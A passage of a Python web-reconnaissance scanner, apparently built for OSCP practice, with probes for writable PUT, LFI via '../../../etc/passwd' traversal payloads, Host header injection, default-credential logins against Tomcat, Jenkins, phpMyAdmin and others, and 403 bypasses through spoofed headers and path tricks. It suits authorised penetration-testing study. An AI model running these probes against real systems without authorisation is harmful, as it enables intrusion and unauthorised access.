                       "--protocols", "--ciphers", f"{host}:{port}"], timeout=60)
    else:
        return ""
    if not out or out == "__TIMEOUT__":
        return ""
    # Extract the key finding lines
    keep = []
    for line in out.splitlines():
        ll = line.lower()
        if any(k in ll for k in (
            "sslv2", "sslv3", "tlsv1.0", "tlsv1.1", "accepted", "preferred",
            "heartbleed", "poodle", "beast", "crime", "logjam", "drown",
            "weak", "null", "export", "rc4", "des", "anon", "certificate",
            "expired", "self-signed", "not trusted", "valid", "subject"
        )):
            keep.append(line.strip())
    return "\n".join(keep[:60])

def check_http_trace(host: str, port: int, use_ssl: bool) -> bool:
    """Check if HTTP TRACE method is enabled (Cross-Site Tracing risk).
    TRACE leaks headers including auth cookies to cross-origin scripts.
    """
    resp = http_request_raw(host, port, "/", use_ssl, method="TRACE",
                            timeout=2.0, max_bytes=4096)
    if not resp:
        return False
    status = http_status_code(resp)
    if status == "200":
        body = http_body_text(resp)
        # TRACE echoes request back; look for TRACE or host header in body
        if "TRACE" in body or host in body:
            return True
    return False

def check_http_put(host: str, port: int, use_ssl: bool) -> List[str]:
    """Test common paths for writable HTTP PUT.
    A writable PUT endpoint means arbitrary file upload → RCE.
    Returns list of paths that accepted PUT (201/204 response).
    """
    paths = ["/test_put_check.txt", "/upload/test_put_check.txt",
             "/files/test_put_check.txt", "/webdav/test_put_check.txt"]
    accepted = []
    for p in paths:
        resp = http_request_raw(host, port, p, use_ssl, method="PUT",
                                timeout=2.0, max_bytes=512,
                                headers={"Content-Type": "text/plain",
                                         "Content-Length": "5"},
                                body=b"test\n")
        if resp:
            status = http_status_code(resp)
            if status in ("200", "201", "204"):
                accepted.append(p)
    return accepted

def check_http_delete(host: str, port: int, use_ssl: bool, put_paths: List[str]) -> List[str]:
    """Try HTTP DELETE on paths we successfully PUT to (cleanup + confirms write access)."""
    deleted = []
    for p in put_paths:
        resp = http_request_raw(host, port, p, use_ssl, method="DELETE",
                                timeout=2.0, max_bytes=512)
        if resp and http_status_code(resp) in ("200", "204", "404"):
            deleted.append(p)
    return deleted

def probe_wordpress_users_api(host: str, port: int, use_ssl: bool) -> List[str]:
    """Enumerate WordPress users via the REST API (/wp-json/wp/v2/users).
    Returns display names / logins. This is passive, unauthenticated recon.
    """
    resp = http_request_raw(host, port, "/wp-json/wp/v2/users",
                            use_ssl, method="GET", timeout=3.0, max_bytes=32000)
    if not resp:
        return []
    status = http_status_code(resp)
    if status != "200":
        return []
    body = http_body_text(resp)
    if not body.startswith("[") and "slug" not in body:
        return []
    users = []
    for m in re.finditer(r'"slug"\s*:\s*"([^"]+)"', body):
        users.append(m.group(1))
    for m in re.finditer(r'"name"\s*:\s*"([^"]+)"', body):
        name = m.group(1)
        if name not in users:
            users.append(name)
    return users[:20]

def probe_cms_version_files(host: str, port: int, use_ssl: bool, tech: List[str]) -> Dict[str, str]:
    """Fetch version-disclosing files for detected CMSes.
    These are standard recon paths, equivalent to manual curl checks.
    Returns {path: version_string}.
    """
    tech_low = " ".join(t.lower() for t in tech)
    checks: List[Tuple[str, str, str]] = []  # (path, cms, regex)

    # Drupal: CHANGELOG.txt, INSTALL.txt, core/CHANGELOG.txt
    if "drupal" in tech_low:
        checks += [
            ("/CHANGELOG.txt", "Drupal", r"Drupal\s+([\d.]+)"),
            ("/core/CHANGELOG.txt", "Drupal", r"Drupal\s+([\d.]+)"),
            ("/INSTALL.txt", "Drupal", r"Drupal\s+([\d.]+)"),
            ("/modules/README.txt", "Drupal", None),
        ]
    # Joomla: administrator/manifests/files/joomla.xml, README.txt
    if "joomla" in tech_low:
        checks += [
            ("/administrator/manifests/files/joomla.xml", "Joomla",
             r"<version>([\d.]+)</version>"),
            ("/README.txt", "Joomla", r"Joomla!\s*([\d.]+)"),
        ]
    # WordPress: readme.html, license.txt
    if "wordpress" in tech_low or "wp-content" in tech_low:
        checks += [
            ("/readme.html", "WordPress", r"Version\s+([\d.]+)"),
            ("/license.txt", "WordPress", r"WordPress.*?Version\s+([\d.]+)"),
            ("/wp-includes/version.php", "WordPress", r"\$wp_version\s*=\s*'([\d.]+)'"),
        ]
    # Moodle: version.php, release notes
    if "moodle" in tech_low:
        checks += [
            ("/version.php", "Moodle", r"release\s*=\s*'([\d. ]+)'"),
        ]
    # Magento: RELEASE_NOTES.md, api.php
    if "magento" in tech_low:
        checks += [
            ("/RELEASE_NOTES.md", "Magento", r"Magento.*?([\d.]+)"),
        ]
    # phpBB
    if "phpbb" in tech_low:
        checks += [
            ("/docs/CHANGELOG.html", "phpBB", r"phpBB\s*([\d.]+)"),
        ]
    # Generic: always check these
    checks += [
        ("/CHANGELOG", "App", r"([\d]+\.[\d]+\.[\d]+)"),
        ("/CHANGELOG.md", "App", r"##\s*v?([\d]+\.[\d]+\.[\d]+)"),
        ("/VERSION", "App", r"([\d]+\.[\d]+\.[\d]+)"),
    ]

    found: Dict[str, str] = {}
    for path, cms, pattern in checks:
        if shutdown_flag.is_set():
            break
        resp = http_request_raw(host, port, path, use_ssl, method="GET",
                                timeout=2.0, max_bytes=12000)
        if not resp:
            continue
        code = http_status_code(resp)
        if code != "200":
            continue
        body = http_body_text(resp).strip()
        if not body or len(body) < 10:
            continue
        version = ""
        if pattern:
            m = re.search(pattern, body, re.I)
            if m:
                version = m.group(1).strip()
        if version:
            found[path] = f"{cms} {version}"
        elif len(body) > 20:
            # No version regex match but file exists — still interesting
            found[path] = f"{cms} (file accessible, {len(body)} bytes)"
    return found

def check_iis_shortname(host: str, port: int, use_ssl: bool) -> bool:
    """Test for IIS 8.3 shortname enumeration vulnerability (the tilde trick).
    Sends a request with a tilde in the path; 404 vs 400 status reveals if names exist.
    This is a passive probe - no exploitation, pure recon.
    """
    # Typical response difference: valid short prefix → 404, invalid → 400
    resp_valid = http_request_raw(host, port, "/a*~1*.aspx", use_ssl,
                                  method="GET", timeout=2.0, max_bytes=512)
    resp_invalid = http_request_raw(host, port, "/zzzzzzzz~1*.aspx", use_ssl,
                                    method="GET", timeout=2.0, max_bytes=512)
    if not resp_valid or not resp_invalid:
        return False
    s_valid = http_status_code(resp_valid)
    s_invalid = http_status_code(resp_invalid)
    # Vulnerable: responses differ between probes (one is 404, other is 400)
    return s_valid != s_invalid and s_valid in ("400", "404") and s_invalid in ("400", "404")

def check_backup_extensions(host: str, port: int, use_ssl: bool,
                             probe_hits: List) -> Dict[str, str]:
    """For each discovered file, try backup/swap extensions.
    Source code backup files (config.php.bak, etc.) are high-value findings.
    Returns {path: first_line_of_content}.
    """
    exts = [".bak", ".old", ".orig", ".backup", ".save", ".copy",
            ".swp", ".swo", "~", ".1", ".tmp", ".disabled"]
    found: Dict[str, str] = {}
    # Only try on actual file paths (not directories)
    file_hits = [p for p in probe_hits
                 if hasattr(p, 'path') and '.' in (p.path or '').split('/')[-1]
                 and (p.status if hasattr(p, 'status') else "") == "200"]
    for wc in file_hits[:25]:  # cap to avoid flooding
        base = wc.path if hasattr(wc, 'path') else str(wc)
        for ext in exts:
            if shutdown_flag.is_set():
                return found
            bak_path = base + ext
            resp = http_request_raw(host, port, bak_path, use_ssl,
                                    method="GET", timeout=1.5, max_bytes=4096)
            if not resp:
                continue
            if http_status_code(resp) == "200":
                snippet = http_body_text(resp).strip()[:200]
                found[bak_path] = snippet
    return found

def check_directory_listing(host: str, port: int, use_ssl: bool,
                              probe_hits: List) -> List[str]:
    """Check discovered directory paths for enabled directory listing.
    Directory listing → file enumeration without brute-forcing.
    """
    dir_hits = [p for p in probe_hits
                if hasattr(p, 'path') and (p.path or "").endswith("/")
                and (p.status if hasattr(p, 'status') else "") == "200"]
    listings: List[str] = []
    for wc in dir_hits[:15]:
        resp = http_request_raw(host, port, wc.path, use_ssl,
                                method="GET", timeout=2.0, max_bytes=24000)
        if not resp:
            continue
        body = http_body_text(resp).lower()
        # Apache/nginx/IIS directory listing indicators
        if any(sig in body for sig in (
            "index of /", "directory listing for", "parent directory",
            "[to parent directory]", "<a href=\"..\">[to parent directory]</a>"
        )):
            listings.append(wc.path)
    return listings

def check_error_disclosure(host: str, port: int, use_ssl: bool) -> List[str]:
    """Trigger error conditions and extract version/path/stack info from responses.
    Error page disclosure is purely passive recon - no exploitation.
    Returns list of interesting strings found.
    """
    findings: List[str] = []
    probes = [
        ("/nonexistent_path_" + "x" * 20, "GET"),  # 404
        ("/%00", "GET"),                              # null byte
        ("/" + "A" * 512, "GET"),                    # long path
        ("/.", "GET"),                                # dot
    ]
    seen_patterns = set()
    version_pat = re.compile(
        r"(apache[/\s][\d.]+|nginx[/\s][\d.]+|php[/\s][\d.]+|"
        r"iis[/\s][\d.]+|tomcat[/\s][\d.]+|python[/\s][\d.]+|"
        r"ruby[/\s][\d.]+|node[./\s][\d.]+|express[/\s][\d.]+|"
        r"werkzeug[/\s][\d.]+|django[/\s][\d.]+|rails[/\s][\d.]+|"
        r"at line \d+|stack trace|traceback|exception in thread|"
        r"system\.web|microsoft\.net|\.dll|\.aspx\"|"
        r"c:\\\\|/var/www|/home/\w+|/usr/share|/etc/\w+)",
        re.I
    )
    for path, method in probes:
        if shutdown_flag.is_set():
            break
        resp = http_request_raw(host, port, path, use_ssl,
                                method=method, timeout=2.0, max_bytes=16000)
        if not resp:
            continue
        body = http_body_text(resp)
        for m in version_pat.finditer(body):
            hit = m.group(0).strip()[:80]
            if hit.lower() not in seen_patterns:
                seen_patterns.add(hit.lower())
                findings.append(hit)
    return findings[:15]

def check_lfi_indicators(host: str, port: int, use_ssl: bool,
                          probe_hits: List) -> List[str]:
    """Look for LFI/path traversal indicators in discovered endpoints.
    Tests basic traversal payloads on endpoints with parameters.
    Passive detection only — no exploitation payload delivery.
    """
    hits: List[str] = []
    lfi_payloads = [
        "/../../../etc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ]
    lfi_sig = re.compile(r"root:[x*]:0:0:|bin:[^:]+:/bin|nobody:[^:]+:/nonexistent", re.I)
    for wc in (probe_hits or [])[:20]:
        p = (wc.path if hasattr(wc, 'path') else str(wc)) or ""
        if "?" not in p:
            continue  # only test parameterised paths
        base_url_path = p.split("?")[0]
        for payload in lfi_payloads:
            if shutdown_flag.is_set():
                return hits
            resp = http_request_raw(host, port, base_url_path + payload,
                                    use_ssl, method="GET", timeout=2.0, max_bytes=8000)
            if resp and lfi_sig.search(http_body_text(resp)):
                hits.append(f"POSSIBLE LFI: {base_url_path} + {payload}")
                break  # one hit per path is enough
    return hits


# ── New OSCP-compliant active checks ─────────────────────────────────────────

def check_host_header_injection(host: str, port: int, use_ssl: bool,
                                 vhost: Optional[str] = None) -> Dict[str, str]:
    """Test for Host header injection vulnerabilities.

    Attack surface: password-reset link poisoning, SSRF via Host, cache poisoning.
    Sends several crafted Host values and checks if they are reflected in the
    response body or Location redirect header.  Purely passive observation —
    no exploitation.

    Returns a dict with finding details, or empty dict if nothing found.
    """
    findings: Dict[str, str] = {}
    _connect = host  # always connect to the real IP/host
    canary = "evil-canary-12345.com"
    # Test 1 — flat evil Host
    for injected_host, label in [
        (canary,                        "Host injection (flat)"),
        (f"{canary}:{port}",            "Host injection (with port)"),
        (f"@{canary}",                  "Host injection (@-prefix)"),
        (f"{vhost or host}@{canary}",   "Host injection (credential-prefix)"),
    ]:
        resp = http_request_raw(_connect, port, "/", use_ssl, method="GET",
                                timeout=2.0, max_bytes=12000,
                                host_header=injected_host)
        if not resp:
            continue
        body = http_body_text(resp)
        hdrs = http_headers(resp)
        location = hdrs.get("Location", "") or hdrs.get("location", "")
        if canary in body:
            findings[label] = f"Canary reflected in response body → host header controls content"
            break
        if canary in location:
            findings[label] = f"Canary in Location redirect → password-reset poisoning likely"
            break
    if findings:
        return findings
    # Test 2 — X-Forwarded-Host bypass (common when proxied)
    target = vhost or host
    resp2 = http_request_raw(_connect, port, "/", use_ssl, method="GET",
                             timeout=2.0, max_bytes=12000,
                             host_header=target,
                             headers={"X-Forwarded-Host": canary})
    if resp2:
        body2 = http_body_text(resp2)
        loc2 = http_headers(resp2).get("Location", "")
        if canary in body2 or canary in loc2:
            findings["X-Forwarded-Host injection"] = (
                "Canary in response via X-Forwarded-Host → proxy trusts this header"
            )
    return findings


# Default-credential profiles for common web management apps.
# Only targets that are OSCP-exam-common and respond to simple basic-auth or
# form-based login are included.  All probes are a single curl GET/POST.
_DEFAULT_CRED_PROFILES = {
    "tomcat": {
        "paths": ["/manager/html", "/host-manager/html"],
        "method": "basic_auth",
        "creds": [("admin", "admin"), ("tomcat", "tomcat"), ("tomcat", "s3cret"),
                  ("admin", "password"), ("admin", "tomcat"), ("manager", "manager")],
        "detect": ["tomcat manager", "application manager", "tomcat web application manager"],
    },
    "jenkins": {
        "paths": ["/login"],
        "method": "form",
        "params": "j_username={user}&j_password={pass}&from=&Submit=Sign+in",
        "success_sig": ["dashboard", "build now", "new item", "manage jenkins"],
        "creds": [("admin", "admin"), ("admin", "password"), ("jenkins", "jenkins"),
                  ("admin", ""), ("root", "root")],
        "detect": ["jenkins", "hudson"],
    },
    "grafana": {
        "paths": ["/login"],
        "method": "json_post",
        "json_tmpl": '{{"user":"{user}","password":"{pass}"}}',
        "login_path": "/api/login",
        "success_sig": ["\"message\":\"Logged in\"", "grafana-session"],
        "creds": [("admin", "admin"), ("admin", "grafana"), ("admin", "password")],
        "detect": ["grafana"],
    },
    "kibana": {
        "paths": ["/app/kibana", "/app/home"],
        "method": "none",  # check for unauthenticated access
        "creds": [],
        "detect": ["kibana", "elastic"],
    },
    "phpmyadmin": {
        "paths": ["/phpmyadmin", "/phpMyAdmin", "/pma", "/mysql", "/dbadmin"],
        "method": "form",
        "params": "pma_username={user}&pma_password={pass}&server=1",
        "success_sig": ["pmaNavigation", "server_databases", "Database list"],
        "creds": [("root", ""), ("root", "root"), ("admin", "admin"), ("pma", "pma")],
        "detect": ["phpmyadmin", "pma"],
    },
    "webmin": {
        "paths": ["/"],
        "method": "basic_auth",
        "creds": [("admin", "admin"), ("root", "root"), ("webmin", "webmin")],
        "detect": ["webmin", "usermin"],
    },
}

def check_default_credentials(host: str, port: int, use_ssl: bool,
                               tech: List[str],
                               vhost: Optional[str] = None) -> List[Dict[str, str]]:
    """Probe for default credentials on known management web apps.

    Only runs targeted probes when the relevant technology is detected in
    the page fingerprint.  Returns list of {app, path, user, finding} dicts.
    All probes are single HTTP requests — no session tracking, no automation
    beyond what a manual curl command would do.  OSCP-compliant.
    """
    tech_blob = " ".join(t.lower() for t in tech)
    findings: List[Dict[str, str]] = []
    _hh = vhost if vhost else ""

    for app, profile in _DEFAULT_CRED_PROFILES.items():
        # Only probe if this app is fingerprinted in the page
        if not any(sig in tech_blob for sig in profile["detect"]):
            continue

        if profile["method"] == "none":
            # Just check if the path is accessible unauthenticated
            for pth in profile["paths"]:
                resp = http_request_raw(host, port, pth, use_ssl, method="GET",
                                        timeout=3.0, max_bytes=8000,
                                        host_header=_hh)
                if not resp:
                    continue
                code = http_status_code(resp)
                if code == "200":
                    findings.append({"app": app, "path": pth, "user": "none",
                                     "finding": f"Unauthenticated access ({code})"})
            continue

        for user, passwd in profile["creds"]:
            if shutdown_flag.is_set():
                return findings
            if profile["method"] == "basic_auth":
                import base64
                token = base64.b64encode(f"{user}:{passwd}".encode()).decode()
                for pth in profile["paths"]:
                    resp = http_request_raw(host, port, pth, use_ssl, method="GET",
                                            timeout=3.0, max_bytes=8000,
                                            headers={"Authorization": f"Basic {token}"},
                                            host_header=_hh)
                    if not resp:
                        continue
                    code = http_status_code(resp)
                    body = http_body_text(resp).lower()
                    if code == "200" and any(sig in body for sig in profile.get("detect", [])):
                        findings.append({"app": app, "path": pth, "user": user,
                                         "finding": f"DEFAULT CREDS WORK: {user}:{passwd}"})
                        return findings  # stop after first hit

            elif profile["method"] == "form":
                for pth in profile["paths"]:
                    post_body = profile["params"].replace("{user}", user).replace("{pass}", passwd)
                    resp = http_request_raw(host, port, pth, use_ssl, method="POST",
                                            timeout=3.0, max_bytes=16000,
                                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                                            body=post_body.encode(),
                                            host_header=_hh)
                    if not resp:
                        continue
                    body = http_body_text(resp).lower()
                    code = http_status_code(resp)
                    if (code in ("200", "302") and
                            any(sig.lower() in body for sig in profile.get("success_sig", []))):
                        findings.append({"app": app, "path": pth, "user": user,
                                         "finding": f"DEFAULT CREDS WORK: {user}:{passwd}"})
                        return findings

    return findings


def check_403_bypass_active(host: str, port: int, use_ssl: bool,
                             paths_403: List[str],
                             vhost: Optional[str] = None) -> Dict[str, Dict]:
    """Actively probe 403-blocked paths with common bypass techniques.

    Techniques tested per path:
      1. Header overrides:  X-Original-URL, X-Rewrite-URL  (path value injected)
      2. IP spoofing:       X-Forwarded-For/X-Real-IP: 127.0.0.1  (on the real path)
      3. Path tricks:       trailing slash, double-slash, ..;/ suffix, URL-encoding
      4. Case variation:    mixed-case path prefix (catches misconfigured ACLs)
      5. HTTP method swap:  POST instead of GET

    False-positive guard: header-override techniques send the request to / and
    compare the response body length against a clean baseline.  If the bypass
    response is within 8% of the baseline homepage size it means the header was
    silently ignored — this was the source of 100% false positives in the previous
    version where every server reported "Bypass succeeded" for X-Original-URL.

    Returns Dict[label, {"cmd": str, "status": str, "snippet": str, "finding": str}]
    """
    if not paths_403:
        return {}

    _hh       = vhost if vhost else ""
    _scheme   = "https" if use_ssl else "http"
    _disp     = vhost if vhost else host           # host to show in curl commands
    _port_sfx = f":{port}" if port not in (80, 443) else ""
    _base_url = f"{_scheme}://{_disp}{_port_sfx}"
    found: Dict[str, Dict] = {}

    # ── Baseline: GET / without any bypass headers ─────────────────────────────
    _bl_resp     = http_request_raw(host, port, "/", use_ssl, method="GET",
                                    timeout=2.0, max_bytes=16000, host_header=_hh)
    _bl_body     = http_body_text(_bl_resp) if _bl_resp else ""
    _bl_len      = len(_bl_body)

    def _is_homepage(body: str) -> bool:
        """Return True if this looks like the same homepage (header was ignored)."""
        if not body or _bl_len == 0:
            return False
        diff = abs(len(body) - _bl_len)
        return diff < max(120, _bl_len * 0.08)   # within 8% → same page

    def _body_snippet(body: str) -> str:
        """Return a clean first meaningful line from a response body."""
        for ln in body.splitlines():
            ln = ln.strip()
            if ln and not ln.startswith(("<!", "<!-", "<!--")):
                return ln[:160]
        return body[:160].strip()

    # ── Prioritise high-value paths ─────────────────────────────────────────
    HIGH_VALUE = ("/.git", "/.env", "/.svn", "/.hg", "/admin", "/manager",
                  "/config", "/.htpasswd", "/backup", "/server-status")
    ordered = sorted(
        paths_403[:30],
        key=lambda p: (0 if any(p.startswith(h) for h in HIGH_VALUE) else 1)
    )[:12]

    for pth in ordered:
        if shutdown_flag.is_set():
            break
        _found_for_path = False

        # ── Technique A: URL-rewrite / path-override headers ────────────────
        # These trick the front-end proxy into forwarding a different internal path.
        for hdr, hval in [
            ("X-Original-URL",   pth),
            ("X-Rewrite-URL",    pth),
            ("X-Override-URL",   pth),
        ]:
            resp = http_request_raw(host, port, "/", use_ssl, method="GET",
                                    timeout=1.5, max_bytes=16000,
                                    headers={hdr: hval}, host_header=_hh)
            if not resp:
                continue
            code   = http_status_code(resp)
            body   = http_body_text(resp)
            if code not in ("200", "301", "302"):
                continue
            if _is_homepage(body):
                continue   # header was silently ignored — false positive
            cmd = f"curl -sk -H '{hdr}: {pth}' '{_base_url}/'"
            found[f"{pth} via {hdr}"] = {
                "cmd": cmd, "status": code,
                "snippet": _body_snippet(body),
                "finding": f"Header bypass confirmed — server routed to {pth} ({len(body)} bytes)",
            }
            _found_for_path = True
            break

        # ── Technique B: IP spoof headers on the real path ──────────────────
        # Tricks IP-based access controls (admin panel restricted to 127.0.0.1).
        if not _found_for_path:
            for hdr, hval in [
                ("X-Forwarded-For",           "127.0.0.1"),
                ("X-Real-IP",                 "127.0.0.1"),
                ("X-Custom-IP-Authorization", "127.0.0.1"),
                ("X-Originating-IP",          "127.0.0.1"),
                ("Client-IP",                 "127.0.0.1"),
            ]:
                resp = http_request_raw(host, port, pth, use_ssl, method="GET",
                                        timeout=1.5, max_bytes=16000,
                                        headers={hdr: hval}, host_header=_hh)
                if not resp:
                    continue
                code = http_status_code(resp)
                body = http_body_text(resp)
                if code not in ("200", "301", "302"):
                    continue
                cmd = f"curl -sk -H '{hdr}: {hval}' '{_base_url}{pth}'"
                found[f"{pth} via {hdr}"] = {
                    "cmd": cmd, "status": code,
                    "snippet": _body_snippet(body),
                    "finding": f"IP-spoof bypass confirmed — {hdr}: 127.0.0.1 grants access ({len(body)} bytes)",
                }
                _found_for_path = True
                break

        # ── Technique C: path-variation tricks ──────────────────────────────
        if not _found_for_path:
            _clean = pth.lstrip("/")
            variants = [
                (pth + "/",                           f"trailing slash"),
                ("/" + _clean + "%20",                f"trailing space (URL-encoded)"),
                (pth + "..;/",                        f"..;/ suffix (Tomcat/Spring bypass)"),
                ("/" + _clean.replace("/", "//", 1),  f"double-slash"),
                ("/" + _clean.replace("/", "/./", 1), f"dot-segment"),
                ("/" + _clean[0].upper() + _clean[1:],f"case variation"),
                ("/%2e/" + _clean,                    f"dot-encoded prefix"),
            ]
            for vpath, label in variants:
                resp = http_request_raw(host, port, vpath, use_ssl, method="GET",
                                        timeout=1.5, max_bytes=16000, host_header=_hh)
                if not resp:
                    continue
                code = http_status_code(resp)
                body = http_body_text(resp)
                if code not in ("200", "301", "302"):
                    continue
                cmd = f"curl -sk '{_base_url}{vpath}'"
                found[f"{pth} via {label}"] = {
                    "cmd": cmd, "status": code,
                    "snippet": _body_snippet(body),
                    "finding": f"Path trick bypass confirmed — '{vpath}' returns {code} ({len(body)} bytes)",
                }
                _found_for_path = True
                break

        # ── Technique D: HTTP method swap ────────────────────────────────────
        if not _found_for_path:
            resp = http_request_raw(host, port, pth, use_ssl, method="POST",
                                    timeout=1.5, max_bytes=4096, host_header=_hh)
            if resp:
                code = http_status_code(resp)
                body = http_body_text(resp)
                if code in ("200", "301", "302"):
                    cmd = f"curl -sk -X POST '{_base_url}{pth}'"
                    found[f"{pth} via POST method"] = {
                        "cmd": cmd, "status": code,
                        "snippet": _body_snippet(body),
                        "finding": f"Method bypass — POST allowed where GET returns 403 ({len(body)} bytes)",
                    }

    return found


def run_wpscan(url: str, timeout: int = 120) -> str:
    """Run wpscan in passive enumeration mode (OSCP-allowed).

    Enumerates: plugins, themes, users, vulnerable plugins/themes.
    --plugins-detection passive means NO extra HTTP requests beyond what
    the normal spider/page-fetch already does — it only analyses what it sees.
    This is explicitly permitted in the OSCP+ exam guide.

    Returns raw wpscan output string, or "" if wpscan not installed.
    """
    if not shutil.which("wpscan"):
        return ""
    cmd = [
        "wpscan", "--url", url,
        "--enumerate", "ap,at,u",   # all plugins, all themes, usernames
        "--plugins-detection", "passive",
        "--no-update",              # don't phone home during exam
        "--format", "cli-no-color",
        "--disable-tls-checks",
    ]
    out = run_cmd(cmd, timeout=timeout)
    if out == "__TIMEOUT__":
        return "[wpscan timeout]"
    return out


def run_ferox_quick(url: str, tech: List[str], timeout: int = 60) -> List[Dict[str, str]]:
    """Run a shallow feroxbuster scan and keep partial results if it gets cut off.

    This is the fast "quick hits" pass:
      - raft-medium wordlist
      - no recursion
      - no link extraction
      - hard stop after ``timeout`` seconds

    Important behaviour: unlike run_cmd(), a timeout does *not* discard output.
    We terminate feroxbuster and parse whatever it already found so the user still
    gets quick wins like /manual or image files discovered in the first seconds.
    """
    if not shutil.which("feroxbuster"):
        return []

    _COMMON_CANDIDATES = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/dirb/wordlists/common.txt",
    ]
    _MEDIUM_CANDIDATES = [
        "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt",
    ]

    tech_blob = " ".join(t.lower() for t in tech)
    host_blob = (urlparse(url).hostname or "").lower()
    path_blob = (urlparse(url).path or "").lower()

    api_like = any(x in tech_blob for x in (
        "uvicorn", "fastapi", "openapi", "swagger", "redoc", "api", "graphql",
        "werkzeug", "flask", "django", "python"
    )) or host_blob.startswith("api.") or "/api" in path_blob

    wordlist = next((w for w in _MEDIUM_CANDIDATES if os.path.isfile(w)), "")
    if not wordlist:
        wordlist = next((w for w in _COMMON_CANDIDATES if os.path.isfile(w)), WL.get("web_common", ""))
    if not wordlist or not os.path.isfile(wordlist):
        return []

    if any(x in tech_blob for x in ("iis", "aspnet", "asp.net", "microsoft")):
        exts = "aspx,asp,ashx,asmx,axd,config,txt,bak,old"
    elif any(x in tech_blob for x in ("java", "tomcat", "jsp", "jboss", "glassfish")):
        exts = "jsp,do,action,xml,txt,bak,old"
    elif api_like:
        exts = "json,yaml,yml,txt,html,bak"
    elif any(x in tech_blob for x in ("ruby", "rails", "sinatra")):
        exts = "rb,txt,json,bak,old"
    elif any(x in tech_blob for x in ("node", "express", "javascript")):
        exts = "js,json,txt,html,bak"
    else:
        exts = "php,txt,html,bak,old,zip,tar.gz"

    cmd = [
        "feroxbuster",
        "-u", url,
        "-w", wordlist,
        "-x", exts,
        "-t", "40",
        "-q",
        "--no-state",
        "--no-recursion",
        "--auto-tune",
        "-C", "404,403",
    ]

    # HTTPS targets often have self-signed certs — always pass -k so feroxbuster
    # doesn't abort the whole scan on a certificate validation error.
    if url.startswith("https://"):
        cmd.append("-k")

    repro_cmd = (
        f"feroxbuster -u '{url}' -x {exts} --no-recursion -C 404,403 "
        f"-t 40 -q --auto-tune"
        + (" -k" if url.startswith("https://") else "")
        + f" -w {wordlist}"
    )

    _env = os.environ.copy()
    _env.update({"PAGER": "cat", "TERM": "dumb", "NO_COLOR": "1", "RUST_BACKTRACE": "0"})

    raw = ""
    timed_out = False
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            env=_env,
        )
        try:
            out, _ = proc.communicate(timeout=timeout)
            raw = out or ""
        except subprocess.TimeoutExpired:
            timed_out = True
            proc.terminate()
            try:
                out, _ = proc.communicate(timeout=3)
                raw = out or ""
            except subprocess.TimeoutExpired:
                proc.kill()
                out, _ = proc.communicate()
                raw = out or ""
    except Exception:
        raw = ""

    results: List[Dict[str, str]] = []
    base_url = url.rstrip("/")
    host_only = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    for line in raw.splitlines():
        line = re.sub(r"\[[0-9;]*m", "", line).strip()
        if not line or line.startswith(("Scanning:", "🚨", "::", "___", "v2.")):
            continue
        # Match common human-readable ferox format, including '-' size field.
        m = re.search(r"^(\d{3})\s+GET\s+\d+l\s+(\d+)w\s+([\d-]+)c\s+(https?://\S+?)(?:\s+=>\s+(https?://\S+))?$", line)
        if not m:
            continue
        status, words, size, hit_url, redirect = m.groups()
        final_url = redirect or hit_url
        if final_url.startswith(base_url):
            path = final_url[len(base_url):] or "/"
        elif final_url.startswith(host_only):
            path = final_url[len(host_only):] or "/"
        else:
            path = urlparse(final_url).path or "/"
        if not path.startswith("/"):
            path = "/" + path
        results.append({
            "path": path,
            "status": status,
            "words": words,
            "size": ("0" if size == "-" else size),
            "cmd": repro_cmd,
            **({"_meta": "timed_out"} if timed_out else {}),
        })

    seen_paths: set = set()
    deduped: List[Dict[str, str]] = []
    for r in sorted(results, key=lambda x: (
            0 if x["status"] == "200" else
            1 if x["status"] in ("301", "302", "307", "308") else
            2 if x["status"] in ("401", "403") else 3,
            x["path"])):
        if r["path"] not in seen_paths:
            seen_paths.add(r["path"])
            deduped.append(r)
    if not deduped:
        return [{
            "path": "(no hits)",
            "status": "0",
            "size": "0",
            "words": "0",
            "cmd": repro_cmd,
            "_meta": "scan_ran_timeout" if timed_out else "scan_ran",
        }]
    return deduped[:120]


def analyze_error_disclosures(error_disclosures: List[str],
                               tech: List[str]) -> List[str]:
    """Cross-reference error-page findings against the known tech stack.

    Produces actionable findings such as:
      - Reverse-proxy leak: Apache in error pages but Werkzeug on frontend
        → separate backend server exposed; Apache version for searchsploit
      - Stack trace / path disclosure → exact paths for LFI wordlists
      - Framework version in error → searchsploit query
      - Debug mode indicators (Werkzeug debugger PIN, Django DEBUG=True)

    Returns a list of human-readable finding strings, empty if nothing notable.
    """
    if not error_disclosures:
        return []

    tech_blob = " ".join(t.lower() for t in tech)
    findings: List[str] = []
    seen: set = set()

    def _add(msg: str):
        if msg not in seen:
            seen.add(msg)
            findings.append(msg)

    for disclosure in error_disclosures:
        d = disclosure.lower().strip()

        # ── Reverse-proxy / backend server leak ──────────────────────────────
        # Error page reveals a DIFFERENT server than the frontend banner
        if re.search(r"apache[/\s][\d.]+", d):
            ver_m = re.search(r"apache[/\s]([\d.]+)", d, re.I)
            ver = ver_m.group(1) if ver_m else "?"
            if "apache" not in tech_blob and "werkzeug" in tech_blob:
                _add(f"⚡ PROXY LEAK: Apache/{ver} in error pages but Werkzeug on frontend "
                     f"→ separate Apache backend; try: searchsploit apache {ver}")
            elif "apache" not in tech_blob:
                _add(f"⚡ SERVER LEAK: Apache/{ver} in error pages (not in banner) "
                     f"→ searchsploit apache {ver}")

        if re.search(r"nginx[/\s][\d.]+", d):
            ver_m = re.search(r"nginx[/\s]([\d.]+)", d, re.I)
            ver = ver_m.group(1) if ver_m else "?"
            if "nginx" not in tech_blob:
                _add(f"⚡ SERVER LEAK: nginx/{ver} in error pages → searchsploit nginx {ver}")

        if re.search(r"php[/\s][\d.]+", d):
            ver_m = re.search(r"php[/\s]([\d.]+)", d, re.I)
            ver = ver_m.group(1) if ver_m else "?"
            _add(f"PHP {ver} version confirmed via error page → searchsploit php {ver}")

        if re.search(r"iis[/\s][\d.]+", d):
